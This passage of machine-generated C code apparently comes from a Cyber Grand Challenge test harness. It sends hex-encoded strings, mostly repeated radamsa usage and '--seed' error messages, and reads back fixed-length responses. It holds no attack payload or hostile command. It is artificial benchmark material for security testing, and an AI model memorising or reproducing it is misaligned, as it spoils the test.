         "\x65\x71\x71\x41\x49\x48\x63\x54\x59\x4c\x77\x68\x68\x45\x6e\x6f"
         "\x58\x56\x5a\x63\x68\x5a\x42\x52\x74\x71\x58\x78\x49\x55\x66\x67"
         "\x70\x76\x43\x4e\x22\x3a\x20\x6e\x75\x6c\x6c\x2c\x20\x22\x6e\x64"
         "\x6f\x45\x65\x68\x4a\x63\x7a\x73\x52\x41\x22\x3a\x20\x66\x61\x6c"
         "\x73\x65\x7d\x00";
      static unsigned int write_00008_00000_len = 3268;
      unsigned char *write_00008 = NULL;
      unsigned int write_00008_len = 0;
      write_00008 = cgc_append_buf(write_00008, &write_00008_len, write_00008_00000, write_00008_00000_len);
      if (write_00008_len > 0) {
         cgc_transmit_all(1, write_00008, write_00008_len);
      }
      cgc_free(write_00008);
   } while (0);
   do {
      unsigned char *read_00009;
      unsigned int read_00009_len;
      unsigned int read_00009_ptr = 0;
      //**** length read
      read_00009_len = 7;
      read_00009 = (unsigned char*)cgc_malloc(read_00009_len);
      int read_00009_res = cgc_length_read(0, read_00009, read_00009_len);
      if (read_00009_res) {} //silence unused variable warning
      cgc_free(read_00009);
      if (read_00009_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00009_00000[] = 
         "\x54\x68\x65\x20\x61\x72\x67\x75\x6d\x65\x6e\x74\x20\x27\x2d\x2d";
      static unsigned int write_00009_00000_len = 16;
      unsigned char *write_00009 = NULL;
      unsigned int write_00009_len = 0;
      write_00009 = cgc_append_buf(write_00009, &write_00009_len, write_00009_00000, write_00009_00000_len);
      if (write_00009_len > 0) {
         cgc_transmit_all(1, write_00009, write_00009_len);
      }
      cgc_free(write_00009);
   } while (0);
   do {
      unsigned char *read_00010;
      unsigned int read_00010_len;
      unsigned int read_00010_ptr = 0;
      //**** length read
      read_00010_len = 25;
      read_00010 = (unsigned char*)cgc_malloc(read_00010_len);
      int read_00010_res = cgc_length_read(0, read_00010, read_00010_len);
      if (read_00010_res) {} //silence unused variable warning
      cgc_free(read_00010);
      if (read_00010_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00010_00000[] = 
         "\x73\x65\x65\x64\x27\x20\x64\x69\x64\x20\x6e\x6f\x74\x20\x61\x63";
      static unsigned int write_00010_00000_len = 16;
      unsigned char *write_00010 = NULL;
      unsigned int write_00010_len = 0;
      write_00010 = cgc_append_buf(write_00010, &write_00010_len, write_00010_00000, write_00010_00000_len);
      if (write_00010_len > 0) {
         cgc_transmit_all(1, write_00010, write_00010_len);
      }
      cgc_free(write_00010);
   } while (0);
   do {
      unsigned char *read_00011;
      unsigned int read_00011_len;
      unsigned int read_00011_ptr = 0;
      //**** length read
      read_00011_len = 25;
      read_00011 = (unsigned char*)cgc_malloc(read_00011_len);
      int read_00011_res = cgc_length_read(0, read_00011, read_00011_len);
      if (read_00011_res) {} //silence unused variable warning
      cgc_free(read_00011);
      if (read_00011_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00011_00000[] = 
         "\x63\x65\x70\x74\x20\x27\x2d\x38\x38\x33\x33\x33\x34\x38\x38\x38";
      static unsigned int write_00011_00000_len = 16;
      unsigned char *write_00011 = NULL;
      unsigned int write_00011_len = 0;
      write_00011 = cgc_append_buf(write_00011, &write_00011_len, write_00011_00000, write_00011_00000_len);
      if (write_00011_len > 0) {
         cgc_transmit_all(1, write_00011, write_00011_len);
      }
      cgc_free(write_00011);
   } while (0);
   do {
      unsigned char *read_00012;
      unsigned int read_00012_len;
      unsigned int read_00012_ptr = 0;
      //**** length read
      read_00012_len = 25;
      read_00012 = (unsigned char*)cgc_malloc(read_00012_len);
      int read_00012_res = cgc_length_read(0, read_00012, read_00012_len);
      if (read_00012_res) {} //silence unused variable warning
      cgc_free(read_00012);
      if (read_00012_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00012_00000[] = 
         "\x30\x38\x36\x37\x36\x30\x33\x33\x32\x27\x2e\x0a";
      static unsigned int write_00012_00000_len = 12;
      unsigned char *write_00012 = NULL;
      unsigned int write_00012_len = 0;
      write_00012 = cgc_append_buf(write_00012, &write_00012_len, write_00012_00000, write_00012_00000_len);
      if (write_00012_len > 0) {
         cgc_transmit_all(1, write_00012, write_00012_len);
      }
      cgc_free(write_00012);
   } while (0);
   do {
      unsigned char *read_00013;
      unsigned int read_00013_len;
      unsigned int read_00013_ptr = 0;
      //**** length read
      read_00013_len = 25;
      read_00013 = (unsigned char*)cgc_malloc(read_00013_len);
      int read_00013_res = cgc_length_read(0, read_00013, read_00013_len);
      if (read_00013_res) {} //silence unused variable warning
      cgc_free(read_00013);
      if (read_00013_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00013_00000[] = 
         "\x55\x73\x61\x67\x65\x3a\x20\x72\x61\x64\x61\x6d\x73\x61\x20\x5b";
      static unsigned int write_00013_00000_len = 16;
      unsigned char *write_00013 = NULL;
      unsigned int write_00013_len = 0;
      write_00013 = cgc_append_buf(write_00013, &write_00013_len, write_00013_00000, write_00013_00000_len);
      if (write_00013_len > 0) {
         cgc_transmit_all(1, write_00013, write_00013_len);
      }
      cgc_free(write_00013);
   } while (0);
   do {
      unsigned char *read_00014;
      unsigned int read_00014_len;
      unsigned int read_00014_ptr = 0;
      //**** length read
      read_00014_len = 25;
      read_00014 = (unsigned char*)cgc_malloc(read_00014_len);
      int read_00014_res = cgc_length_read(0, read_00014, read_00014_len);
      if (read_00014_res) {} //silence unused variable warning
      cgc_free(read_00014);
      if (read_00014_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00014_00000[] = 
         "\x61\x72\x67\x75\x6d\x65\x6e\x74\x73\x5d\x20\x5b\x66\x69\x6c\x65";
      static unsigned int write_00014_00000_len = 16;
      unsigned char *write_00014 = NULL;
      unsigned int write_00014_len = 0;
      write_00014 = cgc_append_buf(write_00014, &write_00014_len, write_00014_00000, write_00014_00000_len);
      if (write_00014_len > 0) {
         cgc_transmit_all(1, write_00014, write_00014_len);
      }
      cgc_free(write_00014);
   } while (0);
   do {
      unsigned char *read_00015;
      unsigned int read_00015_len;
      unsigned int read_00015_ptr = 0;
      //**** length read
      read_00015_len = 25;
      read_00015 = (unsigned char*)cgc_malloc(read_00015_len);
      int read_00015_res = cgc_length_read(0, read_00015, read_00015_len);
      if (read_00015_res) {} //silence unused variable warning
      cgc_free(read_00015);
      if (read_00015_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00015_00000[] = 
         "\x20\x2e\x2e\x2e\x5d\x0a";
      static unsigned int write_00015_00000_len = 6;
      unsigned char *write_00015 = NULL;
      unsigned int write_00015_len = 0;
      write_00015 = cgc_append_buf(write_00015, &write_00015_len, write_00015_00000, write_00015_00000_len);
      if (write_00015_len > 0) {
         cgc_transmit_all(1, write_00015, write_00015_len);
      }
      cgc_free(write_00015);
   } while (0);
   do {
      unsigned char *read_00016;
      unsigned int read_00016_len;
      unsigned int read_00016_ptr = 0;
      //**** length read
      read_00016_len = 25;
      read_00016 = (unsigned char*)cgc_malloc(read_00016_len);
      int read_00016_res = cgc_length_read(0, read_00016, read_00016_len);
      if (read_00016_res) {} //silence unused variable warning
      cgc_free(read_00016);
      if (read_00016_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00016_00000[] = 
         "\x54\x68\x65\x20\x61\x72\x67\x75\x6d\x65\x6e\x74\x20\x27\x2d\x2d";
      static unsigned int write_00016_00000_len = 16;
      unsigned char *write_00016 = NULL;
      unsigned int write_00016_len = 0;
      write_00016 = cgc_append_buf(write_00016, &write_00016_len, write_00016_00000, write_00016_00000_len);
      if (write_00016_len > 0) {
         cgc_transmit_all(1, write_00016, write_00016_len);
      }
      cgc_free(write_00016);
   } while (0);
   do {
      unsigned char *read_00017;
      unsigned int read_00017_len;
      unsigned int read_00017_ptr = 0;
      //**** length read
      read_00017_len = 25;
      read_00017 = (unsigned char*)cgc_malloc(read_00017_len);
      int read_00017_res = cgc_length_read(0, read_00017, read_00017_len);
      if (read_00017_res) {} //silence unused variable warning
      cgc_free(read_00017);
      if (read_00017_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00017_00000[] = 
         "\x73\x65\x65\x64\x27\x20\x64\x69\x64\x20\x6e\x6f\x74\x20\x61\x63";
      static unsigned int write_00017_00000_len = 16;
      unsigned char *write_00017 = NULL;
      unsigned int write_00017_len = 0;
      write_00017 = cgc_append_buf(write_00017, &write_00017_len, write_00017_00000, write_00017_00000_len);
      if (write_00017_len > 0) {
         cgc_transmit_all(1, write_00017, write_00017_len);
      }
      cgc_free(write_00017);
   } while (0);
   do {
      unsigned char *read_00018;
      unsigned int read_00018_len;
      unsigned int read_00018_ptr = 0;
      //**** length read
      read_00018_len = 25;
      read_00018 = (unsigned char*)cgc_malloc(read_00018_len);
      int read_00018_res = cgc_length_read(0, read_00018, read_00018_len);
      if (read_00018_res) {} //silence unused variable warning
      cgc_free(read_00018);
      if (read_00018_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00018_00000[] = 
         "\x63\x65\x70\x74\x20\x27\x2d\x33\x37\x31\x33\x31\x34\x30\x38\x37";
      static unsigned int write_00018_00000_len = 16;
      unsigned char *write_00018 = NULL;
      unsigned int write_00018_len = 0;
      write_00018 = cgc_append_buf(write_00018, &write_00018_len, write_00018_00000, write_00018_00000_len);
      if (write_00018_len > 0) {
         cgc_transmit_all(1, write_00018, write_00018_len);
      }
      cgc_free(write_00018);
   } while (0);
   do {
      unsigned char *read_00019;
      unsigned int read_00019_len;
      unsigned int read_00019_ptr = 0;
      //**** length read
      read_00019_len = 25;
      read_00019 = (unsigned char*)cgc_malloc(read_00019_len);
      int read_00019_res = cgc_length_read(0, read_00019, read_00019_len);
      if (read_00019_res) {} //silence unused variable warning
      cgc_free(read_00019);
      if (read_00019_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00019_00000[] = 
         "\x38\x34\x35\x31\x36\x33\x35\x31\x36\x27\x2e\x0a";
      static unsigned int write_00019_00000_len = 12;
      unsigned char *write_00019 = NULL;
      unsigned int write_00019_len = 0;
      write_00019 = cgc_append_buf(write_00019, &write_00019_len, write_00019_00000, write_00019_00000_len);
      if (write_00019_len > 0) {
         cgc_transmit_all(1, write_00019, write_00019_len);
      }
      cgc_free(write_00019);
   } while (0);
   do {
      unsigned char *read_00020;
      unsigned int read_00020_len;
      unsigned int read_00020_ptr = 0;
      //**** length read
      read_00020_len = 25;
      read_00020 = (unsigned char*)cgc_malloc(read_00020_len);
      int read_00020_res = cgc_length_read(0, read_00020, read_00020_len);
      if (read_00020_res) {} //silence unused variable warning
      cgc_free(read_00020);
      if (read_00020_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00020_00000[] = 
         "\x55\x73\x61\x67\x65\x3a\x20\x72\x61\x64\x61\x6d\x73\x61\x20\x5b";
      static unsigned int write_00020_00000_len = 16;
      unsigned char *write_00020 = NULL;
      unsigned int write_00020_len = 0;
      write_00020 = cgc_append_buf(write_00020, &write_00020_len, write_00020_00000, write_00020_00000_len);
      if (write_00020_len > 0) {
         cgc_transmit_all(1, write_00020, write_00020_len);
      }
      cgc_free(write_00020);
   } while (0);
   do {
      unsigned char *read_00021;
      unsigned int read_00021_len;
      unsigned int read_00021_ptr = 0;
      //**** length read
      read_00021_len = 25;
      read_00021 = (unsigned char*)cgc_malloc(read_00021_len);
      int read_00021_res = cgc_length_read(0, read_00021, read_00021_len);
      if (read_00021_res) {} //silence unused variable warning
      cgc_free(read_00021);
      if (read_00021_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00021_00000[] = 
         "\x61\x72\x67\x75\x6d\x65\x6e\x74\x73\x5d\x20\x5b\x66\x69\x6c\x65";
      static unsigned int write_00021_00000_len = 16;
      unsigned char *write_00021 = NULL;
      unsigned int write_00021_len = 0;
      write_00021 = cgc_append_buf(write_00021, &write_00021_len, write_00021_00000, write_00021_00000_len);
      if (write_00021_len > 0) {
         cgc_transmit_all(1, write_00021, write_00021_len);
      }
      cgc_free(write_00021);
   } while (0);
   do {
      unsigned char *read_00022;
      unsigned int read_00022_len;
      unsigned int read_00022_ptr = 0;
      //**** length read
      read_00022_len = 25;
      read_00022 = (unsigned char*)cgc_malloc(read_00022_len);
      int read_00022_res = cgc_length_read(0, read_00022, read_00022_len);
      if (read_00022_res) {} //silence unused variable warning
      cgc_free(read_00022);
      if (read_00022_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00022_00000[] = 
         "\x20\x2e\x2e\x2e\x5d\x0a";
      static unsigned int write_00022_00000_len = 6;
      unsigned char *write_00022 = NULL;
      unsigned int write_00022_len = 0;
      write_00022 = cgc_append_buf(write_00022, &write_00022_len, write_00022_00000, write_00022_00000_len);
      if (write_00022_len > 0) {
         cgc_transmit_all(1, write_00022, write_00022_len);
      }
      cgc_free(write_00022);
   } while (0);
   do {
      unsigned char *read_00023;
      unsigned int read_00023_len;
      unsigned int read_00023_ptr = 0;
      //**** length read
      read_00023_len = 25;
      read_00023 = (unsigned char*)cgc_malloc(read_00023_len);
      int read_00023_res = cgc_length_read(0, read_00023, read_00023_len);
      if (read_00023_res) {} //silence unused variable warning
      cgc_free(read_00023);
      if (read_00023_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00023_00000[] = 
         "\x54\x68\x65\x20\x61\x72\x67\x75\x6d\x65\x6e\x74\x20\x27\x2d\x2d";
      static unsigned int write_00023_00000_len = 16;
      unsigned char *write_00023 = NULL;
      unsigned int write_00023_len = 0;
      write_00023 = cgc_append_buf(write_00023, &write_00023_len, write_00023_00000, write_00023_00000_len);
      if (write_00023_len > 0) {
         cgc_transmit_all(1, write_00023, write_00023_len);
      }
      cgc_free(write_00023);
   } while (0);
   do {
      unsigned char *read_00024;
      unsigned int read_00024_len;
      unsigned int read_00024_ptr = 0;
      //**** length read
      read_00024_len = 25;
      read_00024 = (unsigned char*)cgc_malloc(read_00024_len);
      int read_00024_res = cgc_length_read(0, read_00024, read_00024_len);
      if (read_00024_res) {} //silence unused variable warning
      cgc_free(read_00024);
      if (read_00024_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00024_00000[] = 
         "\x73\x65\x65\x64\x27\x20\x64\x69\x64\x20\x6e\x6f\x74\x20\x61\x63";
      static unsigned int write_00024_00000_len = 16;
      unsigned char *write_00024 = NULL;
      unsigned int write_00024_len = 0;
      write_00024 = cgc_append_buf(write_00024, &write_00024_len, write_00024_00000, write_00024_00000_len);
      if (write_00024_len > 0) {
         cgc_transmit_all(1, write_00024, write_00024_len);
      }
      cgc_free(write_00024);
   } while (0);
   do {
      unsigned char *read_00025;
      unsigned int read_00025_len;
      unsigned int read_00025_ptr = 0;
      //**** length read
      read_00025_len = 25;
      read_00025 = (unsigned char*)cgc_malloc(read_00025_len);
      int read_00025_res = cgc_length_read(0, read_00025, read_00025_len);
      if (read_00025_res) {} //silence unused variable warning
      cgc_free(read_00025);
      if (read_00025_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00025_00000[] = 
         "\x63\x65\x70\x74\x20\x27\x2d\x38\x32\x33\x35\x32\x35\x31\x34\x34";
      static unsigned int write_00025_00000_len = 16;
      unsigned char *write_00025 = NULL;
      unsigned int write_00025_len = 0;
      write_00025 = cgc_append_buf(write_00025, &write_00025_len, write_00025_00000, write_00025_00000_len);
      if (write_00025_len > 0) {
         cgc_transmit_all(1, write_00025, write_00025_len);
      }
      cgc_free(write_00025);
   } while (0);
   do {
      unsigned char *read_00026;
      unsigned int read_00026_len;
      unsigned int read_00026_ptr = 0;
      //**** length read
      read_00026_len = 25;
      read_00026 = (unsigned char*)cgc_malloc(read_00026_len);
      int read_00026_res = cgc_length_read(0, read_00026, read_00026_len);
      if (read_00026_res) {} //silence unused variable warning
      cgc_free(read_00026);
      if (read_00026_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00026_00000[] = 
         "\x36\x33\x32\x37\x36\x30\x34\x30\x31\x36\x27\x2e\x0a";
      static unsigned int write_00026_00000_len = 13;
      unsigned char *write_00026 = NULL;
      unsigned int write_00026_len = 0;
      write_00026 = cgc_append_buf(write_00026, &write_00026_len, write_00026_00000, write_00026_00000_len);
      if (write_00026_len > 0) {
         cgc_transmit_all(1, write_00026, write_00026_len);
      }
      cgc_free(write_00026);
   } while (0);
   do {
      unsigned char *read_00027;
      unsigned int read_00027_len;
      unsigned int read_00027_ptr = 0;
      //**** length read
      read_00027_len = 25;
      read_00027 = (unsigned char*)cgc_malloc(read_00027_len);
      int read_00027_res = cgc_length_read(0, read_00027, read_00027_len);
      if (read_00027_res) {} //silence unused variable warning
      cgc_free(read_00027);
      if (read_00027_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00027_00000[] = 
         "\x55\x73\x61\x67\x65\x3a\x20\x72\x61\x64\x61\x6d\x73\x61\x20\x5b";
      static unsigned int write_00027_00000_len = 16;
      unsigned char *write_00027 = NULL;
      unsigned int write_00027_len = 0;
      write_00027 = cgc_append_buf(write_00027, &write_00027_len, write_00027_00000, write_00027_00000_len);
      if (write_00027_len > 0) {
         cgc_transmit_all(1, write_00027, write_00027_len);
      }
      cgc_free(write_00027);
   } while (0);
   do {
      unsigned char *read_00028;
      unsigned int read_00028_len;
      unsigned int read_00028_ptr = 0;
      //**** length read
      read_00028_len = 25;
      read_00028 = (unsigned char*)cgc_malloc(read_00028_len);
      int read_00028_res = cgc_length_read(0, read_00028, read_00028_len);
      if (read_00028_res) {} //silence unused variable warning
      cgc_free(read_00028);
      if (read_00028_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00028_00000[] = 
         "\x61\x72\x67\x75\x6d\x65\x6e\x74\x73\x5d\x20\x5b\x66\x69\x6c\x65";
      static unsigned int write_00028_00000_len = 16;
      unsigned char *write_00028 = NULL;
      unsigned int write_00028_len = 0;
      write_00028 = cgc_append_buf(write_00028, &write_00028_len, write_00028_00000, write_00028_00000_len);
      if (write_00028_len > 0) {
         cgc_transmit_all(1, write_00028, write_00028_len);
      }
      cgc_free(write_00028);
   } while (0);
   do {
      unsigned char *read_00029;
      unsigned int read_00029_len;
      unsigned int read_00029_ptr = 0;
      //**** length read
      read_00029_len = 25;
      read_00029 = (unsigned char*)cgc_malloc(read_00029_len);
      int read_00029_res = cgc_length_read(0, read_00029, read_00029_len);
      if (read_00029_res) {} //silence unused variable warning
      cgc_free(read_00029);
      if (read_00029_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00029_00000[] = 
         "\x20\x2e\x2e\x2e\x5d\x0a";
      static unsigned int write_00029_00000_len = 6;
      unsigned char *write_00029 = NULL;
      unsigned int write_00029_len = 0;
      write_00029 = cgc_append_buf(write_00029, &write_00029_len, write_00029_00000, write_00029_00000_len);
      if (write_00029_len > 0) {
         cgc_transmit_all(1, write_00029, write_00029_len);
      }
      cgc_free(write_00029);
   } while (0);
   do {
      unsigned char *read_00030;
      unsigned int read_00030_len;
      unsigned int read_00030_ptr = 0;
      //**** length read
      read_00030_len = 25;
      read_00030 = (unsigned char*)cgc_malloc(read_00030_len);
      int read_00030_res = cgc_length_read(0, read_00030, read_00030_len);
      if (read_00030_res) {} //silence unused variable warning
      cgc_free(read_00030);
      if (read_00030_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00030_00000[] = 
         "\x54\x68\x65\x20\x61\x72\x67\x75\x6d\x65\x6e\x74\x20\x27\x2d\x2d";
      static unsigned int write_00030_00000_len = 16;
      unsigned char *write_00030 = NULL;
      unsigned int write_00030_len = 0;
      write_00030 = cgc_append_buf(write_00030, &write_00030_len, write_00030_00000, write_00030_00000_len);
      if (write_00030_len > 0) {
         cgc_transmit_all(1, write_00030, write_00030_len);
      }
      cgc_free(write_00030);
   } while (0);
   do {
      unsigned char *read_00031;
      unsigned int read_00031_len;
      unsigned int read_00031_ptr = 0;
      //**** length read
      read_00031_len = 25;
      read_00031 = (unsigned char*)cgc_malloc(read_00031_len);
      int read_00031_res = cgc_length_read(0, read_00031, read_00031_len);
      if (read_00031_res) {} //silence unused variable warning
      cgc_free(read_00031);
      if (read_00031_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00031_00000[] = 
         "\x73\x65\x65\x64\x27\x20\x64\x69\x64\x20\x6e\x6f\x74\x20\x61\x63";
      static unsigned int write_00031_00000_len = 16;
      unsigned char *write_00031 = NULL;
      unsigned int write_00031_len = 0;
      write_00031 = cgc_append_buf(write_00031, &write_00031_len, write_00031_00000, write_00031_00000_len);
      if (write_00031_len > 0) {
         cgc_transmit_all(1, write_00031, write_00031_len);
      }
      cgc_free(write_00031);
   } while (0);
   do {
      unsigned char *read_00032;
      unsigned int read_00032_len;
      unsigned int read_00032_ptr = 0;
      //**** length read
      read_00032_len = 25;
      read_00032 = (unsigned char*)cgc_malloc(read_00032_len);
      int read_00032_res = cgc_length_read(0, read_00032, read_00032_len);
      if (read_00032_res) {} //silence unused variable warning
      cgc_free(read_00032);
      if (read_00032_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00032_00000[] = 
         "\x63\x65\x70\x74\x20\x27\x2d\x32\x37\x35\x31\x33\x36\x32\x34\x33";
      static unsigned int write_00032_00000_len = 16;
      unsigned char *write_00032 = NULL;
      unsigned int write_00032_len = 0;
      write_00032 = cgc_append_buf(write_00032, &write_00032_len, write_00032_00000, write_00032_00000_len);
      if (write_00032_len > 0) {
         cgc_transmit_all(1, write_00032, write_00032_len);
      }
      cgc_free(write_00032);
   } while (0);
   do {
      unsigned char *read_00033;
      unsigned int read_00033_len;
      unsigned int read_00033_ptr = 0;
      //**** length read
      read_00033_len = 25;
      read_00033 = (unsigned char*)cgc_malloc(read_00033_len);
      int read_00033_res = cgc_length_read(0, read_00033, read_00033_len);
      if (read_00033_res) {} //silence unused variable warning
      cgc_free(read_00033);
      if (read_00033_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00033_00000[] = 
         "\x37\x30\x37\x37\x39\x37\x38\x32\x30\x38\x27\x2e\x0a";
      static unsigned int write_00033_00000_len = 13;
      unsigned char *write_00033 = NULL;
      unsigned int write_00033_len = 0;
      write_00033 = cgc_append_buf(write_00033, &write_00033_len, write_00033_00000, write_00033_00000_len);
      if (write_00033_len > 0) {
         cgc_transmit_all(1, write_00033, write_00033_len);
      }
      cgc_free(write_00033);
   } while (0);
   do {
      unsigned char *read_00034;
      unsigned int read_00034_len;
      unsigned int read_00034_ptr = 0;
      //**** length read
      read_00034_len = 25;
      read_00034 = (unsigned char*)cgc_malloc(read_00034_len);
      int read_00034_res = cgc_length_read(0, read_00034, read_00034_len);
      if (read_00034_res) {} //silence unused variable warning
      cgc_free(read_00034);
      if (read_00034_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00034_00000[] = 
         "\x55\x73\x61\x67\x65\x3a\x20\x72\x61\x64\x61\x6d\x73\x61\x20\x5b";
      static unsigned int write_00034_00000_len = 16;
      unsigned char *write_00034 = NULL;
      unsigned int write_00034_len = 0;
      write_00034 = cgc_append_buf(write_00034, &write_00034_len, write_00034_00000, write_00034_00000_len);
      if (write_00034_len > 0) {
         cgc_transmit_all(1, write_00034, write_00034_len);
      }
      cgc_free(write_00034);
   } while (0);
   do {
      unsigned char *read_00035;
      unsigned int read_00035_len;
      unsigned int read_00035_ptr = 0;
      //**** length read
      read_00035_len = 25;
      read_00035 = (unsigned char*)cgc_malloc(read_00035_len);
      int read_00035_res = cgc_length_read(0, read_00035, read_00035_len);
      if (read_00035_res) {} //silence unused variable warning
      cgc_free(read_00035);
      if (read_00035_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00035_00000[] = 
         "\x61\x72\x67\x75\x6d\x65\x6e\x74\x73\x5d\x20\x5b\x66\x69\x6c\x65";
      static unsigned int write_00035_00000_len = 16;
      unsigned char *write_00035 = NULL;
      unsigned int write_00035_len = 0;
      write_00035 = cgc_append_buf(write_00035, &write_00035_len, write_00035_00000, write_00035_00000_len);
      if (write_00035_len > 0) {
         cgc_transmit_all(1, write_00035, write_00035_len);
      }
      cgc_free(write_00035);
   } while (0);
   do {
      unsigned char *read_00036;
      unsigned int read_00036_len;
      unsigned int read_00036_ptr = 0;
      //**** length read
      read_00036_len = 25;
      read_00036 = (unsigned char*)cgc_malloc(read_00036_len);
      int read_00036_res = cgc_length_read(0, read_00036, read_00036_len);
      if (read_00036_res) {} //silence unused variable warning
      cgc_free(read_00036);
      if (read_00036_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00036_00000[] = 
         "\x20\x2e\x2e\x2e\x5d\x0a";
      static unsigned int write_00036_00000_len = 6;
      unsigned char *write_00036 = NULL;
      unsigned int write_00036_len = 0;
      write_00036 = cgc_append_buf(write_00036, &write_00036_len, write_00036_00000, write_00036_00000_len);
      if (write_00036_len > 0) {
         cgc_transmit_all(1, write_00036, write_00036_len);
      }
      cgc_free(write_00036);
   } while (0);
   do {
      unsigned char *read_00037;
      unsigned int read_00037_len;
      unsigned int read_00037_ptr = 0;
      //**** length read
      read_00037_len = 25;
      read_00037 = (unsigned char*)cgc_malloc(read_00037_len);
      int read_00037_res = cgc_length_read(0, read_00037, read_00037_len);
      if (read_00037_res) {} //silence unused variable warning
      cgc_free(read_00037);
      if (read_00037_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00037_00000[] = 
         "\x54\x68\x65\x20\x61\x72\x67\x75\x6d\x65\x6e\x74\x20\x27\x2d\x2d";
      static unsigned int write_00037_00000_len = 16;
      unsigned char *write_00037 = NULL;
      unsigned int write_00037_len = 0;
      write_00037 = cgc_append_buf(write_00037, &write_00037_len, write_00037_00000, write_00037_00000_len);
      if (write_00037_len > 0) {
         cgc_transmit_all(1, write_00037, write_00037_len);
      }
      cgc_free(write_00037);
   } while (0);
   do {
      unsigned char *read_00038;
      unsigned int read_00038_len;
      unsigned int read_00038_ptr = 0;
      //**** length read
      read_00038_len = 25;
      read_00038 = (unsigned char*)cgc_malloc(read_00038_len);
      int read_00038_res = cgc_length_read(0, read_00038, read_00038_len);
      if (read_00038_res) {} //silence unused variable warning
      cgc_free(read_00038);
      if (read_00038_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00038_00000[] = 
         "\x73\x65\x65\x64\x27\x20\x64\x69\x64\x20\x6e\x6f\x74\x20\x61\x63";
      static unsigned int write_00038_00000_len = 16;
      unsigned char *write_00038 = NULL;
      unsigned int write_00038_len = 0;
      write_00038 = cgc_append_buf(write_00038, &write_00038_len, write_00038_00000, write_00038_00000_len);
      if (write_00038_len > 0) {
         cgc_transmit_all(1, write_00038, write_00038_len);
      }
      cgc_free(write_00038);
   } while (0);
   do {
      unsigned char *read_00039;
      unsigned int read_00039_len;
      unsigned int read_00039_ptr = 0;
      //**** length read
      read_00039_len = 25;
      read_00039 = (unsigned char*)cgc_malloc(read_00039_len);
      int read_00039_res = cgc_length_read(0, read_00039, read_00039_len);
      if (read_00039_res) {} //silence unused variable warning
      cgc_free(read_00039);
      if (read_00039_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00039_00000[] = 
         "\x63\x65\x70\x74\x20\x27\x2d\x34\x39\x37\x30\x37\x38\x34\x32\x39";
      static unsigned int write_00039_00000_len = 16;
      unsigned char *write_00039 = NULL;
      unsigned int write_00039_len = 0;
      write_00039 = cgc_append_buf(write_00039, &write_00039_len, write_00039_00000, write_00039_00000_len);
      if (write_00039_len > 0) {
         cgc_transmit_all(1, write_00039, write_00039_len);
      }
      cgc_free(write_00039);
   } while (0);
   do {
      unsigned char *read_00040;
      unsigned int read_00040_len;
      unsigned int read_00040_ptr = 0;
      //**** length read
      read_00040_len = 25;
      read_00040 = (unsigned char*)cgc_malloc(read_00040_len);
      int read_00040_res = cgc_length_read(0, read_00040, read_00040_len);
      if (read_00040_res) {} //silence unused variable warning
      cgc_free(read_00040);
      if (read_00040_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00040_00000[] = 
         "\x36\x37\x33\x37\x39\x35\x34\x34\x35\x35\x27\x2e\x0a";
      static unsigned int write_00040_00000_len = 13;
      unsigned char *write_00040 = NULL;
      unsigned int write_00040_len = 0;
      write_00040 = cgc_append_buf(write_00040, &write_00040_len, write_00040_00000, write_00040_00000_len);
      if (write_00040_len > 0) {
         cgc_transmit_all(1, write_00040, write_00040_len);
      }
      cgc_free(write_00040);
   } while (0);
   do {
      unsigned char *read_00041;
      unsigned int read_00041_len;
      unsigned int read_00041_ptr = 0;
      //**** length read
      read_00041_len = 25;
      read_00041 = (unsigned char*)cgc_malloc(read_00041_len);
      int read_00041_res = cgc_length_read(0, read_00041, read_00041_len);
      if (read_00041_res) {} //silence unused variable warning
      cgc_free(read_00041);
      if (read_00041_ptr) {}  //silence unused variable warning if any
